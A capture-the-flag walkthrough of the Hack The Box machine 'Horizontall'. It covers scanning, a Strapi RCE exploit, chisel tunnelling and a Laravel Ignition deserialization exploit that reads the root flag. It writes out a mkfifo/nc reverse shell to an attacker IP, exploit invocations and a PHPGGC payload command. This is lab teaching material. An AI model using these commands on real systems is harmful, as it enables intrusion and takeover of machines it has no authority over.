# [horizontall](https://app.hackthebox.eu/machines/Horizontall)

> A Linux box running a [Strapi](https://strapi.io/) version with a [remote code execution vulnerability](https://www.exploit-db.com/exploits/50239). With user access, establish a reverse port forward tunnel to the target's `localhost` TCP port 8000, which is hosting a vulnerable Laravel application with debugging enabled. Exploit a [remote code execution vulnerability](https://www.ambionics.io/blog/laravel-debug-rce) in this web application to get system access.

---

## Open Port Discovery

```bash
$ masscan -p1-65535 10.10.11.105 --rate=1000 -e tun0 --output-format grepable --output-filename horizontall.masscan
$ cat horizontall.masscan | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','
22,80,
```

---

## Open Port Enumeration

```bash
$ nmap -sC -sV -O -p22,80 10.10.11.105 -oA horizontall
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-10 19:12 UTC
Nmap scan report for ip-10-10-11-105.us-east-2.compute.internal (10.10.11.105)
Host is up (0.018s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 5.0 - 5.3 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.77 seconds
```

---

## Web Application Enumeration

Browsing to the machine's IP address yields a 301 redirect to `http://horizontall.htb`. Add this hostname to the local DNS resolver.

### Content Discovery

```bash
$ gobuster dir -u http://horizontall.htb -w /usr/share/wordlists/Seclists/Discovery/Web-Content/raft-small-words.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://horizontall.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/Seclists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/09/10 15:39:51 Starting gobuster in directory enumeration mode
===============================================================
/js                   (Status: 301) [Size: 194] [--> http://horizontall.htb/js/]
/css                  (Status: 301) [Size: 194] [--> http://horizontall.htb/css/]
/img                  (Status: 301) [Size: 194] [--> http://horizontall.htb/img/]
/.                    (Status: 301) [Size: 194] [--> http://horizontall.htb/./]  
                                                                                 
===============================================================
2021/09/10 15:42:49 Finished
===============================================================
```

All of these paths (`/js/`, `/css/`, and `/img/`) return 403 forbiddens.

### Manual Enumeration

The web application appears to be a single page application. Its landing page has no real functionality. However, investigating the source with Chrome's developer tools reveals that the application was built with Vue.js.

![Pasted image 20210910165917](images/Pasted%20image%2020210910165917.png)

In the Vue application's entry point, `App.vue`, a `GET` request is made to `http://api-prod.horizontall.htb/reviews`.

```javascript
...
<script>
import axios from 'axios'
import Navbar from './components/Navbar.vue'
import Home from './components/Home.vue'
export default {
  name: 'App',
  components: {
    Navbar,
    Home
  },
  data(){
    return {
      reviews:[],
    }
  },
  methods:{
    getReviews(){
      axios.get('http://api-prod.horizontall.htb/reviews')
      .then(response => this.reviews = response.data)
    }
  }
}
</script>
...
```

Adding the `api-prod.horizontall.htb` host to the local DNS resolver and making this request from the attacker machine yields the following response:

```json
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Fri, 10 Sep 2021 20:52:13 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 507
Connection: close
Vary: Origin
Content-Security-Policy: img-src 'self' http:; block-all-mixed-content
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Powered-By: Strapi <strapi.io>

[
    {
        "id": 1,
        "name": "wail",
        "description": "This is good service",
        "stars": 4,
        "created_at": "2021-05-29T13:23:38.000Z",
        "updated_at": "2021-05-29T13:23:38.000Z"
    },
    {
        "id": 2,
        "name": "doe",
        "description": "i'm satisfied with the product",
        "stars": 5,
        "created_at": "2021-05-29T13:24:17.000Z",
        "updated_at": "2021-05-29T13:24:17.000Z"
    },
    {
        "id": 3,
        "name": "john",
        "description": "create service with minimum price i hop i can buy more in the futur",
        "stars": 5,
        "created_at": "2021-05-29T13:25:26.000Z",
        "updated_at": "2021-05-29T13:25:26.000Z"
    }
]
```

Note the `X-Powered-By` header: `Strapi <strapi.io>`. `api-prod.horizontall.htb` is a [Strapi CMS instance](https://strapi.io/).

---

## RCE to Foothold

A [remote code execution vulnerability exploit](https://www.exploit-db.com/exploits/50239) is available for Strapi version `3.0.0-beta.17.4`. The exploit appears to submit a `GET` request to `/admin/init` to determine its version. Submitting the same request confirms that the target is running the vulnerable version of Strapi.

```json
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Fri, 10 Sep 2021 20:54:01 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 144
Connection: close
Vary: Origin
Content-Security-Policy: img-src 'self' http:; block-all-mixed-content
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Powered-By: Strapi <strapi.io>

{
    "data": {
        "uuid": "a55da3bd-9693-4a08-9279-f9df57fd1817",
        "currentEnvironment": "development",
        "autoReload": false,
        "strapiVersion": "3.0.0-beta.17.4"
    }
}
```

The exploit works perfectly, though with a catch. It is blind remote code execution. Execute the following to receive a reverse shell.

```bash
python3 50239.py http://api-prod.horizontall.htb
[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit


[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMxMzExODI3LCJleHAiOjE2MzM5MDM4Mjd9.X4FJJ-SnG0RaTX6KsJCZWeVAu24Z1Drzp1kzma6zfEw


$> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.194 443 >/tmp/f
```

Catch the shell.

```bash
$ sudo nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.194] from (UNKNOWN) [10.10.11.105] 56366
/bin/sh: 0: can't access tty; job control turned off
$ whoami
strapi
```

The user flag is at `/home/developer/user.txt` and world-readable.

---

## Privilege Escalation

### Enumeration

```bash
$ id
uid=1001(strapi) gid=1001(strapi) groups=1001(strapi)
```

```bash
$ netstat -ano | grep LISTEN
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp6       0      0 :::80                   :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)
unix  2      [ ACC ]     SEQPACKET  LISTENING     786      /run/udev/control
unix  2      [ ACC ]     STREAM     LISTENING     33279    /run/user/0/systemd/private
unix  2      [ ACC ]     STREAM     LISTENING     31474    /run/user/1001/systemd/private
unix  2      [ ACC ]     STREAM     LISTENING     33283    /run/user/0/gnupg/S.gpg-agent
unix  2      [ ACC ]     STREAM     LISTENING     31478    /run/user/1001/snapd-session-agent.socket
unix  2      [ ACC ]     STREAM     LISTENING     33284    /run/user/0/gnupg/S.gpg-agent.ssh
unix  2      [ ACC ]     STREAM     LISTENING     31479    /run/user/1001/gnupg/S.gpg-agent.ssh
unix  2      [ ACC ]     STREAM     LISTENING     33285    /run/user/0/gnupg/S.gpg-agent.extra
unix  2      [ ACC ]     STREAM     LISTENING     31480    /run/user/1001/gnupg/S.dirmngr
unix  2      [ ACC ]     STREAM     LISTENING     33286    /run/user/0/gnupg/S.dirmngr
unix  2      [ ACC ]     STREAM     LISTENING     31481    /run/user/1001/gnupg/S.gpg-agent
unix  2      [ ACC ]     STREAM     LISTENING     33287    /run/user/0/gnupg/S.gpg-agent.browser
unix  2      [ ACC ]     STREAM     LISTENING     31482    /run/user/1001/gnupg/S.gpg-agent.browser
unix  2      [ ACC ]     STREAM     LISTENING     33288    /run/user/0/snapd-session-agent.socket
unix  2      [ ACC ]     STREAM     LISTENING     31483    /run/user/1001/gnupg/S.gpg-agent.extra
unix  2      [ ACC ]     STREAM     LISTENING     29573    /opt/strapi/.pm2/pub.sock
unix  2      [ ACC ]     STREAM     LISTENING     26791    @irqbalance1139.sock
unix  2      [ ACC ]     STREAM     LISTENING     29574    /opt/strapi/.pm2/rpc.sock
unix  2      [ ACC ]     STREAM     LISTENING     24247    /var/run/vmware/guestServicePipe
unix  2      [ ACC ]     STREAM     LISTENING     29113    /var/run/mysqld/mysqld.sock
unix  2      [ ACC ]     STREAM     LISTENING     25843    @ISCSIADM_ABSTRACT_NAMESPACE
unix  2      [ ACC ]     STREAM     LISTENING     769      /run/systemd/private
unix  2      [ ACC ]     STREAM     LISTENING     778      /run/lvm/lvmpolld.socket
unix  2      [ ACC ]     STREAM     LISTENING     790      /run/systemd/journal/stdout
unix  2      [ ACC ]     STREAM     LISTENING     853      /run/lvm/lvmetad.socket
unix  2      [ ACC ]     STREAM     LISTENING     25103    /run/acpid.socket
unix  2      [ ACC ]     STREAM     LISTENING     25105    /var/run/dbus/system_bus_socket
unix  2      [ ACC ]     STREAM     LISTENING     25107    /run/snapd.socket
unix  2      [ ACC ]     STREAM     LISTENING     25109    /run/snapd-snap.socket
unix  2      [ ACC ]     STREAM     LISTENING     25841    /run/uuidd/request
```

Interesting service running on `localhost:8000`.

Use [`chisel`](https://github.com/jpillora/chisel) to create a reverse port forward tunnel from the attacker's port 8000 to the target's `localhost:8000`.

Attacker machine:

```bash
$ ./chisel server --port 8001 --reverse
2021/09/13 16:11:56 server: Reverse tunnelling enabled
2021/09/13 16:11:56 server: Fingerprint Psszvjj2hLYexKQ1GrdJvfHffICS9cgw33F0092z7Js=
2021/09/13 16:11:56 server: Listening on http://0.0.0.0:8001
2021/09/13 16:11:59 server: session#1: tun: proxy#R:8000=>localhost:8000: Listening
```

Target machine:

```bash
$ ./chisel client 10.10.14.88:8001 R:8000:localhost:8000
2021/09/13 16:11:46 client: Connecting to ws://10.10.14.88:8001
2021/09/13 16:11:59 client: Connected (Latency 19.117196ms)
```

Browse to localhost 8000 on the attacker's machine. It is hosting a Laravel web application, version `Laravel v8 (PHP v7.4.18)`.

![](images/Pasted%20image%2020210913165026.png)

Use `gobuster` to discover content on the web application.

```bash
$ gobuster dir -u http://127.0.0.1:8000 -w /usr/share/wordlists/raft-small-words.txt
```

There is a path `/profiles` that displays a debugging page.

![](images/Pasted%20image%2020210913165249.png)

Researching Laravel debugging vulnerabilities yields the following [blog post](https://www.ambionics.io/blog/laravel-debug-rce) and [Github repository](https://github.com/ambionics/laravel-exploits).

### Exploitation

Clone the repository and the [repository for PHPGGC](https://github.com/ambionics/phpggc). On the attacker machine, generate the payload for the exploit.

```bash
php -d'phar.readonly=0' /opt/phpggc/phpggc --phar phar -o root-flag.phar --fast-destruct monolog/rce1 system 'cat /root/root.txt'
```

Launch the exploit from the Github repository to read the `root` flag.

```bash
python3 laravel-exploits/laravel-ignition-rce.py http://localhost:8000 root-flag.phar
```
